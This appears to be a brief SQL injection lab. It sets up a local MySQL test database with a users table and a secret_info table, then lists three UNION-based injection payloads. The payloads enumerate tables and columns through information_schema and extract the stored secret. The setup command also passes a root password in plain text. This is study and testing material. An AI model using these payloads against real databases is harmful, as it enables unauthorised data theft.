## setup

```bash
docker exec -it my_mysql_container mysql -u root -prootpassword testdb
```

```
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    email VARCHAR(50)
);

CREATE TABLE secret_info (
    id INT AUTO_INCREMENT PRIMARY KEY,
    secret VARCHAR(255)
);

INSERT INTO users (username, email) VALUES ('admin', 'admin@example.com');
INSERT INTO users (username, email) VALUES ('user', 'user@example.com');
INSERT INTO secret_info (secret) VALUES ('This is a secret.');

GRANT SELECT ON testdb.users TO 'readonlyuser'@'%';
FLUSH PRIVILEGES;
```

## attack input

```
admin' UNION SELECT NULL, secret, NULL FROM secret_info where 'a' = 'a
admin' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'secret_info' AND 'a'='a
admin' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE 'a'='a
```
